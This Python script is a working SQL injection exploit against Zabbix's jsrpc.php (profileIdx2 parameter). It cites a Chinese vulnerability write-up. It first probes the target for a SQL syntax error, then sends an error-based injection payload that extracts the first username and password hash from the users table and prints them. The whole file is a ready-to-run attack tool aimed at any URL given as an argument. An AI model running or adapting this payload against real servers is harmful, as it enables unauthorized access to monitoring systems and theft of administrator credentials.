import requests
import re
import sys
#http://www.freebuf.com/vuls/112197.html 漏洞信息


def detect_zabbix(url):
	payload = "/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471054088083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=2'3297&updateProfile=true&screenitemid=&period=3600&stime=20170813040734&resourcetype=17&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&mark_color=1"
	try:
		request_html = requests.get(url+payload,timeout=10).content.decode('utf-8')
		key = re.compile(r"You have an error in your SQL syntax\;")
		if key.findall(request_html):
			print("[+] 存在SQLinject：")
			exploit(url)
		else:
			print("[-] 不存在SQLinject：")
	except Exception as msg:
		print(msg)


def exploit(url):
	sqlinject_code = "(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select concat(name,0x3a,passwd) from  users limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
	payload = "{}/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2={}&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids[23297]=23297&action=showlatest&filter=&filter_task=&mark_color=1".format(url,sqlinject_code)
	try:
		request_html = requests.get(payload,timeout=10).content.decode('utf-8')
		result = re.compile(r"Duplicate\s*entry\s*'~(.*?)~1")
		if result.findall(request_html):
			key = result.findall(request_html)[0].split(':')
			print("[+] Username:{}".format(key[0]))
			print("[+] Password:{}".format(key[1]))
			return True
	except Exception as msg:
		print(msg)



if __name__ == '__main__':
	if len(sys.argv)!=2:
		print("Usage: Python", sys.argv[0], "http://domain")
		sys.exit()
	url = sys.argv[1]
	detect_zabbix(url)
